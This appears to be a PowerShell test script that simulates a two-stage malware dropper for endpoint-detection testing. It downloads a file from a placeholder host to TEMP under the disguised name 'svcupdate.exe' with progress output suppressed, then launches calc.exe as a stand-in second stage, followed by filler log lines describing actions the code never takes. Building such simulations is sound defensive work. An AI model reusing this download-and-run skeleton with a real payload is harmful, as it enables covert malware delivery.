
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://contoso.com/stage1.ps1',
    [string]$PayloadPath = "$env:TEMP\svcupdate.exe",
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TransferTimeout = 159
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 159
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $StageResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $PayloadPath -TimeoutSec $TransferTimeout
    if ($StageResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $DownloadUrl
    Destination = $PayloadPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Inspecting process list"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Set-Location -Path $env:TEMP
